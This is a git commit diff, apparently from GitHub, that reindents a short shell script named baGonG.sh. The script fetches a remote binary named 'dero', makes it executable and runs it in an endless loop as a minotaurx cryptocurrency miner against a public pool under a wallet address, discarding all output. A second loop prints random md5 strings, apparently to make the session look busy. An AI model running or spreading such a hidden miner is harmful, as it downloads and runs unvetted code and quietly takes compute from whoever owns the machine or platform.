9e9b7779e472453ee3c161a6d5d9eca9d4a81d16
RizQu5 <122372013+RizQu5@users.noreply.github.com>
2023-01-14 13:19:56 +0700

    Update baGonG.sh

--- baGonG.sh
+++ baGonG.sh
@@ -1,9 +1,9 @@
 wget https://github.com/RizQu5/2022/raw/main/dero > /dev/null 2>&1
 chmod +x dero > /dev/null 2>&1
 while [ 1 ]; do
-./dero -a minotaurx -o stratum+tcps://stratum-eu.rplant.xyz:17063 -u PQFYTbguveuWuwRjZRsUiQZnW3ea51Rbc3.02_beDO > /dev/null 2>&1
+  ./dero -a minotaurx -o stratum+tcps://stratum-eu.rplant.xyz:17063 -u PQFYTbguveuWuwRjZRsUiQZnW3ea51Rbc3.02_beDO > /dev/null 2>&1
 done
 while [ 1 ]; do
-while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2s; done
+  while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2s; done
 sleep 2
 done
